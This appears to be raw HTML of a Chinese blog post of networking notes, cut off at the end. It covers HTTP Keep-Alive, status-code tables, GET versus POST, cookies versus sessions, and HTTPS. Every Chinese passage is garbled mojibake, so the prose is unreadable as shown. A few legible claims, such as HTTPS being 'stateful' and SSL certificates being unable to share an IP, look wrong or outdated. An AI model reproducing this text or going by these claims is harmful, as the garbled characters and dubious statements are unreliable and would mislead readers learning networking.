Keep-Aliveï¼Œè¿™ä¸ªé”®å€¼å¯¹çš„ä½œç”¨æ˜¯è®©HTTPä¿æŒè¿æ¥çŠ¶æ€ï¼Œå› ä¸ºHTTP åè®®é‡‡ç”¨â€œè¯·æ±‚-åº”ç­”â€æ¨¡å¼ï¼Œå½“ä½¿ç”¨æ™®é€šæ¨¡å¼ï¼Œå³é Keep-Alive æ¨¡å¼æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚&#x2F;åº”ç­”å®¢æˆ·å’ŒæœåŠ¡å™¨éƒ½è¦æ–°å»ºä¸€ä¸ªè¿æ¥ï¼Œå®Œæˆä¹‹åç«‹å³æ–­å¼€è¿æ¥ï¼ˆHTTP åè®®ä¸ºæ— è¿æ¥çš„åè®®ï¼‰ï¼›å½“ä½¿ç”¨ Keep-Alive æ¨¡å¼æ—¶ï¼ŒKeep-Alive åŠŸèƒ½ä½¿å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ç«¯çš„è¿æ¥æŒç»­æœ‰æ•ˆã€‚</p><p>åœ¨HTTP 1.1ç‰ˆæœ¬åï¼Œé»˜è®¤éƒ½å¼€å¯Keep-Aliveæ¨¡å¼ï¼Œåªæœ‰åŠ å…¥åŠ å…¥ Connection: closeæ‰å…³é—­è¿æ¥ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è®¾ç½®Keep-Aliveæ¨¡å¼çš„å±æ€§ï¼Œä¾‹å¦‚ Keep-Alive: timeout&#x3D;5, max&#x3D;100ï¼Œè¡¨ç¤ºè¿™ä¸ªTCPé€šé“å¯ä»¥ä¿æŒ5ç§’ï¼Œmax&#x3D;100ï¼Œè¡¨ç¤ºè¿™ä¸ªé•¿è¿æ¥æœ€å¤šæ¥æ”¶100æ¬¡è¯·æ±‚å°±æ–­å¼€ã€‚</p><h3><span id="çŠ¶æ€ç ">çŠ¶æ€ç </span></h3><p>HTTPçŠ¶æ€ç æ€»çš„åˆ†ä¸ºäº”ç±»ï¼š</p><p>1å¼€å¤´ï¼šä¿¡æ¯çŠ¶æ€ç </p><p>2å¼€å¤´ï¼šæˆåŠŸçŠ¶æ€ç </p><p>3å¼€å¤´ï¼šé‡å®šå‘çŠ¶æ€ç </p><p>4å¼€å¤´ï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç </p><p>5å¼€å¤´ï¼šæœåŠ¡ç«¯é”™è¯¯çŠ¶æ€ç </p><p> <strong>1XX</strong>ï¼šä¿¡æ¯çŠ¶æ€ç </p><table><thead><tr><th><strong>çŠ¶æ€ç </strong></th><th><strong>å«ä¹‰</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>100</td><td>ç»§ç»­</td><td>åˆå§‹çš„è¯·æ±‚å·²ç»æ¥å—ï¼Œè¯·å®¢æˆ·ç«¯ç»§ç»­å‘é€å‰©ä½™éƒ¨åˆ†</td></tr><tr><td>101</td><td>åˆ‡æ¢åè®®</td><td>è¯·æ±‚è¿™è¦æ±‚æœåŠ¡å™¨åˆ‡æ¢åè®®ï¼ŒæœåŠ¡å™¨å·²ç¡®å®šåˆ‡æ¢</td></tr></tbody></table><p> <strong>2XX</strong>ï¼šæˆåŠŸçŠ¶æ€ç </p><table><thead><tr><th><strong>çŠ¶æ€ç </strong></th><th><strong>å«ä¹‰</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>200</td><td>æˆåŠŸ</td><td>æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚</td></tr><tr><td>201</td><td>å·²åˆ›å»º</td><td>è¯·æ±‚æˆåŠŸå¹¶ä¸”æœåŠ¡å™¨åˆ›å»ºäº†æ–°çš„èµ„æº</td></tr><tr><td>202</td><td>å·²æ¥å—</td><td>æœåŠ¡å™¨å·²æ¥å—è¯·æ±‚ï¼Œä½†å°šæœªå¤„ç†</td></tr><tr><td>203</td><td>éæˆæƒä¿¡æ¯</td><td>æœåŠ¡å™¨å·²æˆåŠŸå¤„ç†è¯·æ±‚ï¼Œä½†è¿”å›çš„ä¿¡æ¯å¯èƒ½æ¥è‡ªå¦ä¸€ä¸ªæ¥æº</td></tr><tr><td>204</td><td>æ— å†…å®¹</td><td>æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹</td></tr><tr><td>205</td><td>é‡ç½®å†…å®¹</td><td>æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯åº”é‡ç½®æ–‡æ¡£è§†å›¾</td></tr><tr><td>206</td><td>éƒ¨åˆ†å†…å®¹</td><td>æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚</td></tr></tbody></table><p><strong>3XX</strong>ï¼šé‡å®šå‘çŠ¶æ€ç </p><table><thead><tr><th><strong>çŠ¶æ€ç </strong></th><th><strong>å«ä¹‰</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>300</td><td>å¤šç§é€‰æ‹©</td><td>é’ˆå¯¹è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯æ‰§è¡Œå¤šç§æ“ä½œ</td></tr><tr><td>301</td><td>æ°¸ä¹…ç§»åŠ¨</td><td>è¯·æ±‚çš„é¡µé¢å·²æ°¸ä¹…è·³è½¬åˆ°æ–°çš„url</td></tr><tr><td>302</td><td>ä¸´æ—¶ç§»åŠ¨</td><td>æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚ä»ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚</td></tr><tr><td>303</td><td>æŸ¥çœ‹å…¶ä»–ä½ç½®</td><td>è¯·æ±‚è€…åº”å½“å¯¹ä¸åŒçš„ä½ç½®ä½¿ç”¨å•ç‹¬çš„GETè¯·æ±‚æ¥æ£€ç´¢å“åº”æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤ä»£ç </td></tr><tr><td>304</td><td>æœªä¿®æ”¹</td><td>è‡ªä»ä¸Šæ¬¡è¯·æ±‚åï¼Œè¯·æ±‚çš„ç½‘é¡µæœªä¿®æ”¹è¿‡</td></tr><tr><td>305</td><td>ä½¿ç”¨ä»£ç†</td><td>è¯·æ±‚è€…åªèƒ½ä½¿ç”¨ä»£ç†è®¿é—®è¯·æ±‚çš„ç½‘é¡µ</td></tr><tr><td>307</td><td>ä¸´æ—¶é‡å®šå‘</td><td>æœåŠ¡å™¨ç›®å‰ä»ä¸åŒä½ç½®çš„ç½‘é¡µå“åº”è¯·æ±‚ï¼Œä½†è¯·æ±‚è€…åº”ç»§ç»­ä½¿ç”¨åŸæœ‰ä½ç½®æ¥è¿›è¡Œä»¥åçš„è¯·æ±‚</td></tr></tbody></table><p><strong>4XX</strong>ï¼šå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç </p><table><thead><tr><th><strong>çŠ¶æ€ç </strong></th><th><strong>å«ä¹‰</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>400</td><td>é”™è¯¯è¯·æ±‚</td><td>æœåŠ¡å™¨ä¸ç†è§£è¯·æ±‚çš„è¯­æ³•</td></tr><tr><td>401</td><td>æœªæˆæƒ</td><td>è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½æ¼”éªŒè¯</td></tr><tr><td>403</td><td>ç¦æ­¢</td><td>æœåŠ¡å™¨æ‹’ç»è¯·æ±‚</td></tr><tr><td>404</td><td>æœªæ‰¾åˆ°</td><td>æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„é¡µé¢</td></tr><tr><td>405</td><td>æ–¹æ³•ç¦ç”¨</td><td>ç¦ç”¨è¯·æ±‚ä¸­æŒ‡å®šçš„æ–¹æ³•</td></tr><tr><td>406</td><td>ä¸æ¥å—</td><td>æ— æ³•ä½¿ç”¨è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å“åº”è¯·æ±‚çš„é¡µé¢</td></tr><tr><td>407</td><td>éœ€è¦ä»£ç†æˆæƒ</td><td>è¯·æ±‚éœ€è¦ä»£ç†çš„èº«ä»½è®¤è¯</td></tr><tr><td>408</td><td>è¯·æ±‚è¶…æ—¶</td><td>æœåŠ¡å™¨ç­‰å€™è¯·æ±‚æ—¶å‘ç”Ÿè¶…æ—¶</td></tr><tr><td>409</td><td>å†²çª</td><td>æœåŠ¡å™¨åœ¨å®Œæˆè¯·æ±‚æ—¶å‘ç”Ÿå†²çª</td></tr><tr><td>410</td><td>å·²åˆ é™¤</td><td>å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨</td></tr><tr><td>411</td><td>éœ€è¦æœ‰æ•ˆé•¿åº¦</td><td>æœåŠ¡å™¨ä¸æ¥å—ä¸å«æœ‰æ•ˆé•¿åº¦è¡¨å¤´å­—æ®µçš„è¯·æ±‚</td></tr><tr><td>412</td><td>æœªæ»¡è¶³å‰ææ¡ä»¶</td><td>æœåŠ¡å™¨æœªæ»¡è¶³è¯·æ±‚è€…åœ¨è¯·æ±‚ä¸­è®¾ç½®çš„å…¶ä¸­ä¸€ä¸ªå‰ææ¡ä»¶</td></tr><tr><td>413</td><td>è¯·æ±‚å®ä½“è¿‡å¤§</td><td>ç”±äºè¯·æ±‚å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚</td></tr><tr><td>414</td><td>è¯·æ±‚urlè¿‡é•¿</td><td>è¯·æ±‚çš„urlè¿‡é•¿ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†</td></tr><tr><td>415</td><td>ä¸æ”¯æŒæ ¼å¼</td><td>æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ä¸­é™„å¸¦åª’ä½“æ ¼å¼</td></tr><tr><td>416</td><td>èŒƒå›´æ— æ•ˆ</td><td>å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ</td></tr><tr><td>417</td><td>æœªæ»¡è¶³æœŸæœ›</td><td>æœåŠ¡å™¨æ— æ³•æ»¡è¶³è¯·æ±‚è¡¨å¤´å­—æ®µè¦æ±‚</td></tr></tbody></table><p><strong>5XX</strong>ï¼šæœåŠ¡ç«¯é”™è¯¯çŠ¶æ€ç </p><table><thead><tr><th>çŠ¶æ€ç </th><th>å«ä¹‰</th><th>æè¿°</th></tr></thead><tbody><tr><td>500</td><td>æœåŠ¡å™¨é”™è¯¯</td><td>æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚</td></tr><tr><td>501</td><td>å°šæœªå®æ–½</td><td>æœåŠ¡å™¨ä¸å…·å¤‡å®Œæˆè¯·æ±‚çš„åŠŸèƒ½</td></tr><tr><td>502</td><td>é”™è¯¯ç½‘å…³</td><td>æœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–ä»£ç†å‡ºç°é”™è¯¯</td></tr><tr><td>503</td><td>æœåŠ¡ä¸å¯ç”¨</td><td>æœåŠ¡å™¨ç›®å‰æ— æ³•ä½¿ç”¨</td></tr><tr><td>504</td><td>ç½‘å…³è¶…æ—¶</td><td>ç½‘å…³æˆ–ä»£ç†æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶è·å–è¯·æ±‚</td></tr><tr><td>505</td><td>ä¸æ”¯æŒç‰ˆæœ¬</td><td>æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚ä¸­ä½¿ç”¨çš„HTTPåè®®ç‰ˆæœ¬</td></tr></tbody></table><h3><span id="getå’Œpostçš„åŒºåˆ«-">GETå’ŒPOSTçš„åŒºåˆ« -</span></h3><ul><li>GETæ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œé€šå¸¸ç”¨äºè¯·æ±‚æœåŠ¡å™¨å‘é€æŸä¸ªèµ„æºï¼Œè€Œä¸”åº”è¯¥æ˜¯å®‰å…¨çš„å’Œå¹‚ç­‰çš„ã€‚</li></ul><p>(1). æ‰€è°“å®‰å…¨æ˜¯æŒ‡è¯¥æ“ä½œç”¨äºè·å–ä¿¡æ¯è€Œéä¿®æ”¹ä¿¡æ¯ã€‚</p><p>(2). å¹‚ç­‰æ˜¯æŒ‡å¯¹åŒä¸€ä¸ªURLçš„å¤šä¸ªè¯·æ±‚åº”è¯¥è¿”å›åŒæ ·çš„ç»“æœã€‚</p><ul><li><p>POSTæ–¹æ³•å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œæ¯”å¦‚å®Œæˆè¡¨å•æ•°æ®çš„æäº¤ï¼Œå°†æ•°æ®æäº¤ç»™æœåŠ¡å™¨å¤„ç†ã€‚ </p></li><li><p>GETè¯·æ±‚é™„åŠ åœ¨URLä¹‹åï¼Œä»¥?åˆ†å‰²URLå’Œä¼ è¾“æ•°æ®ï¼Œå¤šä¸ªå‚æ•°ç”¨&amp;è¿æ¥ã€‚</p></li><li><p>POSTè¯·æ±‚ä¼šæŠŠè¯·æ±‚çš„æ•°æ®æ”¾ç½®åœ¨HTTPè¯·æ±‚åŒ…çš„åŒ…ä½“ä¸­ã€‚ </p></li><li><p>GETè¯·æ±‚å¯ä»¥è¢«CDNç¼“å­˜å­˜å‚¨ï¼ŒPOSTä¸è¡Œ</p></li></ul><h3><span id="ä»€ä¹ˆæ˜¯cookie">ä»€ä¹ˆæ˜¯Cookie âˆš</span></h3><p>Ã˜ æ˜¯ç”±æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„ç‰¹æ®Šä¿¡æ¯ï¼Œä»¥æ–‡æœ¬å½¢å¼å­˜æ”¾åœ¨å®¢æˆ·ç«¯ã€‚</p><p>ç”¨æˆ·é€šè¿‡æµè§ˆå™¨è®¿é—®ä¸€ä¸ªæ”¯æŒCookieçš„ç½‘ç«™åï¼Œç”¨æˆ·ä¼šæä¾›åŒ…æ‹¬ç”¨æˆ·ååœ¨å†…çš„ä¸ªäººä¿¡æ¯å¹¶ä¸”æäº¤è‡³æœåŠ¡å™¨ï¼Œ<strong>æœåŠ¡å™¨å‘é€è¶…æ–‡æœ¬çš„æ—¶å€™ä¼šå°†ä¿¡æ¯å¤¹å¸¦åœ¨httpå“åº”å¤´é‡Œé¢</strong>ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°åå°±å°†ä¿¡æ¯å­˜æ”¾èµ·æ¥ã€‚</p><p>Ã˜ å®¢æˆ·ç«¯å†æ¬¡è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šæŠŠCookieå›å‘ï¼ˆå­˜æ”¾åœ¨httpè¯·æ±‚å¤´é‡Œï¼‰</p><p>Ã˜ æœåŠ¡å™¨æ¥æ”¶åˆ°åï¼Œä¼šè§£æCookieç”Ÿæˆä¸å®¢æˆ·ç«¯ç›¸å¯¹åº”çš„å†…å®¹</p><h2><span id="ä»€ä¹ˆæ˜¯session-">ä»€ä¹ˆæ˜¯Session -</span></h2><p>Ã˜ æœåŠ¡å™¨ç«¯çš„æœºåˆ¶ï¼Œåœ¨æœåŠ¡å™¨ä¸Šä¿å­˜çš„ä¿¡æ¯</p><p>Ã˜ è§£æå®¢æˆ·ç«¯è¯·æ±‚å¹¶æ“ä½œsession idï¼ŒæŒ‰éœ€ä¿å­˜çŠ¶æ€ä¿¡æ¯</p><p>Ã˜ å®ç°æ–¹å¼ï¼š</p><ol><li><p>ä½¿ç”¨Cookieæ¥å®ç°ï¼Œç»™æ¯ä¸ªcookieåˆ†é…ä¸€ä¸ªå”¯ä¸€çš„JSESSIONIDï¼Œå¹¶é€šè¿‡Cookieå‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å†æ¬¡è¯·æ±‚çš„æ—¶å€™ä¼šæºå¸¦ä¸ŠJSESSIONID</p></li><li><p>ä½¿ç”¨URLå›å†™ï¼ŒæœåŠ¡å™¨åœ¨å‘é€ç»™æµè§ˆå™¨çš„æ‰€æœ‰é¡µé¢éƒ½æºå¸¦JSESSIONIDçš„å‚æ•°ï¼Œè¿™æ ·å®¢æˆ·ç«¯ç‚¹å‡»ä»»ä½•ä¸€ä¸ªé“¾æ¥éƒ½ä¼šæŠŠJSESSIONIDå¸¦å›æœåŠ¡å™¨ã€‚</p></li></ol><p>Tomcatä¸€å¼€å§‹ä¸¤è€…éƒ½ä½¿ç”¨ï¼Œå¦‚æœæ”¯æŒCookieå°±åœæ­¢URLé‡å†™ã€‚</p><h3><span id="cookieå’Œsessionçš„åŒºåˆ«">Cookieå’ŒSessionçš„åŒºåˆ«</span></h3><h4><span id="1-å­˜å‚¨ä½ç½®ä¸åŒ">1ã€å­˜å‚¨ä½ç½®ä¸åŒ</span></h4><p>cookieçš„æ•°æ®ä¿¡æ¯å­˜æ”¾åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸Šã€‚</p><p>sessionçš„æ•°æ®ä¿¡æ¯å­˜æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚</p><h4><span id="2-å­˜å‚¨å®¹é‡ä¸åŒ">2ã€å­˜å‚¨å®¹é‡ä¸åŒ</span></h4><p>å•ä¸ªcookieä¿å­˜çš„æ•°æ®&lt;&#x3D;4KBï¼Œä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜20ä¸ªCookieã€‚</p><p>å¯¹äºsessionæ¥è¯´å¹¶æ²¡æœ‰ä¸Šé™ï¼Œä½†å‡ºäºå¯¹æœåŠ¡å™¨ç«¯çš„æ€§èƒ½è€ƒè™‘ï¼Œsessionå†…ä¸è¦å­˜æ”¾è¿‡å¤šçš„ä¸œè¥¿ï¼Œå¹¶ä¸”è®¾ç½®sessionåˆ é™¤æœºåˆ¶ã€‚</p><h4><span id="3-å­˜å‚¨æ–¹å¼ä¸åŒ">3ã€å­˜å‚¨æ–¹å¼ä¸åŒ</span></h4><p>cookieä¸­åªèƒ½ä¿ç®¡ASCIIå­—ç¬¦ä¸²ï¼Œå¹¶éœ€è¦é€šè¿‡ç¼–ç æ–¹å¼å­˜å‚¨ä¸ºUnicodeå­—ç¬¦æˆ–è€…äºŒè¿›åˆ¶æ•°æ®ã€‚</p><p>sessionä¸­èƒ½å¤Ÿå­˜å‚¨ä»»ä½•ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬ä¸”ä¸é™äºstringï¼Œintegerï¼Œlistï¼Œmapç­‰ã€‚</p><h4><span id="4-éšç§ç­–ç•¥ä¸åŒ">4ã€éšç§ç­–ç•¥ä¸åŒ</span></h4><p>cookieå¯¹å®¢æˆ·ç«¯æ˜¯å¯è§çš„ï¼Œåˆ«æœ‰ç”¨å¿ƒçš„äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„cookieå¹¶è¿›è¡Œcookieæ¬ºéª—ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸å®‰å…¨çš„ã€‚</p><p>sessionå­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¯¹å®¢æˆ·ç«¯æ˜¯é€æ˜å¯¹ï¼Œä¸å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„æ¼çš„é£é™©ã€‚</p><h4><span id="5-æœ‰æ•ˆæœŸä¸Šä¸åŒ">5ã€æœ‰æ•ˆæœŸä¸Šä¸åŒ</span></h4><p>å¼€å‘å¯ä»¥é€šè¿‡è®¾ç½®cookieçš„å±æ€§ï¼Œè¾¾åˆ°ä½¿cookieé•¿æœŸæœ‰æ•ˆçš„æ•ˆæœã€‚</p><p>sessionä¾èµ–äºåä¸ºJSESSIONIDçš„cookieï¼Œè€Œcookie JSESSIONIDçš„è¿‡æœŸæ—¶é—´é»˜è®¤ä¸º-1ï¼Œåªéœ€å…³é—­çª—å£è¯¥sessionå°±ä¼šå¤±æ•ˆï¼Œå› è€Œsessionä¸èƒ½è¾¾åˆ°é•¿æœŸæœ‰æ•ˆçš„æ•ˆæœã€‚</p><h4><span id="6-æœåŠ¡å™¨å‹åŠ›ä¸åŒ">6ã€æœåŠ¡å™¨å‹åŠ›ä¸åŒ</span></h4><p>cookieä¿ç®¡åœ¨å®¢æˆ·ç«¯ï¼Œä¸å ç”¨æœåŠ¡å™¨èµ„æºã€‚å¯¹äºå¹¶å‘ç”¨æˆ·ååˆ†å¤šçš„ç½‘ç«™ï¼Œcookieæ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚</p><p>sessionæ˜¯ä¿ç®¡åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªsessionã€‚å‡å¦‚å¹¶å‘è®¿é—®çš„ç”¨æˆ·ååˆ†å¤šï¼Œä¼šäº§ç”Ÿååˆ†å¤šçš„sessionï¼Œè€—è´¹å¤§é‡çš„å†…å­˜ã€‚</p><h4><span id="7-æµè§ˆå™¨æ”¯æŒä¸åŒ">7ã€æµè§ˆå™¨æ”¯æŒä¸åŒ</span></h4><p>å‡å¦‚å®¢æˆ·ç«¯æµè§ˆå™¨ä¸æ”¯æŒcookieï¼š</p><p>cookieæ˜¯éœ€è¦å®¢æˆ·ç«¯æµè§ˆå™¨æ”¯æŒçš„ï¼Œå‡å¦‚å®¢æˆ·ç«¯ç¦ç”¨äº†cookieï¼Œæˆ–è€…ä¸æ”¯æŒcookieï¼Œåˆ™ä¼šè¯è·Ÿè¸ªä¼šå¤±æ•ˆã€‚å…³äºWAPä¸Šçš„åº”ç”¨ï¼Œå¸¸è§„çš„cookieå°±æ´¾ä¸ä¸Šç”¨åœºäº†ã€‚</p><p>è¿ç”¨sessionéœ€è¦ä½¿ç”¨URLåœ°å€é‡å†™çš„æ–¹å¼ã€‚ä¸€åˆ‡ç”¨åˆ°sessionç¨‹åºçš„URLéƒ½è¦è¿›è¡ŒURLåœ°å€é‡å†™ï¼Œå¦åˆ™sessionä¼šè¯è·Ÿè¸ªè¿˜ä¼šå¤±æ•ˆã€‚</p><p>å‡å¦‚å®¢æˆ·ç«¯æ”¯æŒcookieï¼š</p><p>cookieæ—¢èƒ½å¤Ÿè®¾ä¸ºæœ¬æµè§ˆå™¨çª—å£ä»¥åŠå­çª—å£å†…æœ‰æ•ˆï¼Œä¹Ÿèƒ½å¤Ÿè®¾ä¸ºä¸€åˆ‡çª—å£å†…æœ‰æ•ˆã€‚</p><p>sessionåªèƒ½åœ¨æœ¬çª—å£ä»¥åŠå­çª—å£å†…æœ‰æ•ˆã€‚</p><h4><span id="8-è·¨åŸŸæ”¯æŒä¸Šä¸åŒ">8ã€è·¨åŸŸæ”¯æŒä¸Šä¸åŒ</span></h4><p>cookieæ”¯æŒè·¨åŸŸåè®¿é—®ã€‚</p><p>sessionä¸æ”¯æŒè·¨åŸŸåè®¿é—®ã€‚</p><h3><span id="httpå’Œhttpsçš„åŒºåˆ«">Httpå’ŒHttpsçš„åŒºåˆ«</span></h3><h4><span id="sslå®‰å…¨å¥—æ¥å±‚">SSLï¼ˆå®‰å…¨å¥—æ¥å±‚ï¼‰</span></h4><p>Ã˜ ä¸ºç½‘ç»œé€šä¿¡æä¾›å®‰å…¨åŠæ•°æ®å®Œæ•´æ€§çš„ä¸€ç§å®‰å…¨åè®®</p><p>Ã˜ æ˜¯æ“ä½œç³»ç»Ÿå¯¹å¤–çš„APIï¼ŒSSL3.0åæ”¹åä¸ºTLS</p><p>Ã˜ é‡‡ç”¨<strong>èº«ä»½éªŒè¯</strong>å’Œ<strong>æ•°æ®åŠ å¯†</strong>ä¿è¯ç½‘ç»œé€šä¿¡çš„å®‰å…¨å’Œæ•°æ®çš„å®Œæ•´æ€§</p><h4><span id="httpsæ•°æ®ä¼ è¾“æµç¨‹">Httpsæ•°æ®ä¼ è¾“æµç¨‹ï¼š</span></h4><p>Ã˜ æµè§ˆå™¨å°†æ”¯æŒçš„åŠ å¯†ç®—æ³•ä¿¡æ¯å‘é€ç»™æœåŠ¡å™¨ </p><p>Ã˜ æœåŠ¡å™¨é€‰æ‹©ä¸€å¥—æµè§ˆå™¨æ”¯æŒçš„åŠ å¯†ç®—æ³•ï¼Œä»¥è¯ä¹¦çš„å½¢å¼å›å‘æµè§ˆå™¨</p><p>Ã˜ æµè§ˆå™¨éªŒè¯è¯ä¹¦åˆæ³•æ€§ï¼Œå¹¶ç»“åˆè¯ä¹¦å…¬é’¥åŠ å¯†ç§˜é’¥å‘é€ç»™æœåŠ¡å™¨</p><p>Ã˜ æœåŠ¡å™¨ä½¿ç”¨ç§é’¥è§£å¯†ä¿¡æ¯ï¼ŒéªŒè¯å“ˆå¸Œï¼ŒåŠ å¯†å“åº”æ¶ˆæ¯å›å‘æµè§ˆå™¨</p><p>Ã˜ æµè§ˆå™¨è§£å¯†å“åº”æ¶ˆæ¯ï¼Œå¹¶å¯¹æ¶ˆæ¯è¿›è¡ŒéªŒè¯ï¼Œä¹‹åè¿›è¡ŒåŠ å¯†äº¤äº’æ•°æ®ã€‚</p><h4><span id="äºŒ-httpä¸httpsçš„åŒºåˆ«">äºŒã€Httpä¸Httpsçš„åŒºåˆ«</span></h4><p>Ã˜ HTTPSåè®®éœ€è¦åˆ°CA ç”³è¯·è¯ä¹¦ï¼ŒHTTPä¸éœ€è¦ </p><p>Ã˜ HTTPSå¯†æ–‡ä¼ è¾“ï¼ŒHTTPæ˜æ–‡ä¼ è¾“</p><p>Ã˜ HTTPSé»˜è®¤ä½¿ç”¨443ç«¯å£ï¼ŒHTTPä½¿ç”¨80ç«¯å£</p><p>Ã˜ HTTPæ˜¯æ— çŠ¶æ€çš„ï¼ŒHTTPSæ˜¯æœ‰çŠ¶æ€çš„SSL+HTTPæ„å»ºçš„ç½‘ç»œåè®®</p><p>æ— çŠ¶æ€çš„æ„æ€æ˜¯å…¶æ•°æ®åŒ…çš„å‘é€ã€ä¼ è¾“å’Œæ¥æ”¶éƒ½æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚æ— è¿æ¥çš„æ„æ€æ˜¯æŒ‡é€šä¿¡åŒæ–¹éƒ½ä¸é•¿ä¹…çš„ç»´æŒå¯¹æ–¹çš„ä»»ä½•ä¿¡æ¯ã€‚</p><h4><span id="äº”-httpsçš„ç¼ºç‚¹å¯¹æ¯”ä¼˜ç‚¹">äº”ã€Httpsçš„ç¼ºç‚¹ï¼ˆå¯¹æ¯”ä¼˜ç‚¹ï¼‰</span></h4><p>1ã€Httpsåè®®æ¡æ‰‹é˜¶æ®µæ¯”è¾ƒè´¹æ—¶ï¼Œä¼šä½¿é¡µé¢çš„åŠ è½½æ—¶é—´å»¶é•¿è¿‘ã€‚</p><p>2ã€Httpsè¿æ¥ç¼“å­˜ä¸å¦‚Httpé«˜æ•ˆï¼Œä¼šå¢åŠ æ•°æ®å¼€é”€ï¼Œç”šè‡³å·²æœ‰çš„å®‰å…¨æªæ–½ä¹Ÿä¼šå› æ­¤è€Œå—åˆ°å½±å“ã€‚</p><p>3ã€Httpsåè®®çš„å®‰å…¨æ˜¯æœ‰èŒƒå›´çš„ï¼Œåœ¨é»‘å®¢æ”»å‡»ã€æ‹’ç»æœåŠ¡æ”»å‡»å’ŒæœåŠ¡å™¨åŠ«æŒç­‰æ–¹é¢å‡ ä¹èµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨ã€‚</p><p>4ã€SSLè¯ä¹¦é€šå¸¸éœ€è¦ç»‘å®šIPï¼Œä¸èƒ½åœ¨åŒä¸€IPä¸Šç»‘å®šå¤šä¸ªåŸŸåï¼ŒIPv4èµ„æºä¸å¯èƒ½æ”¯æ’‘è¿™ä¸ªæ¶ˆè€—ã€‚</p><p>5ã€æˆæœ¬å¢åŠ ã€‚éƒ¨ç½² Httpsåï¼Œå› ä¸º Httpsåè®®çš„å·¥ä½œè¦å¢åŠ é¢å¤–çš„è®¡ç®—èµ„æºæ¶ˆè€—ï¼Œä¾‹å¦‚ SSL åè®®åŠ å¯†ç®—æ³•å’Œ SSL äº¤äº’æ¬¡æ•°å°†å ç”¨ä¸€å®šçš„è®¡ç®—èµ„æºå’ŒæœåŠ¡å™¨æˆæœ¬ã€‚</p><p>6ã€Httpsåè®®çš„åŠ å¯†èŒƒå›´ä¹Ÿæ¯”è¾ƒæœ‰é™ã€‚æœ€å…³é”®çš„ï¼ŒSSLè¯ä¹¦çš„ä¿¡ç”¨é“¾ä½“ç³»å¹¶ä¸å®‰å…¨ï¼Œç‰¹åˆ«æ˜¯åœ¨æŸäº›å›½å®¶å¯ä»¥æ§åˆ¶CAæ ¹è¯ä¹¦çš„æƒ…å†µä¸‹ï¼Œä¸­é—´äººæ”»å‡»ä¸€æ ·å¯è¡Œã€‚</p><p>ä¸€èˆ¬æµè§ˆå™¨éƒ½æ˜¯å°†åœ°å€è§£ææˆhttpçš„ç„¶åé€šè¿‡é‡å®šå‘åˆ°httpsï¼Œè¿™ä¸ªè¿‡ç¨‹å¯èƒ½è¢«åŠ«æŒ</p><h2><span id="å„å±‚å¸¸è§åè®®">å„å±‚å¸¸è§åè®®</span></h2><p>ç½‘é™…é“¾è·¯å±‚ï¼šä»¥å¤ªç½‘åè®®</p><p>ç½‘ç»œå±‚ï¼šIPã€ARPã€RARP</p><p>ä¼ è¾“å±‚ï¼šTCPã€UDP</p><p>åº”ç”¨å±‚ï¼šSMTP FTP HTTP</p><h2><span id="socket">Socket</span></h2><p><img src="/2020/03/30/Network/clip_image002-1585538329691.jpg"></p><p><img src="/2020/03/30/Network/clip_image004.jpg"></p><h4><span 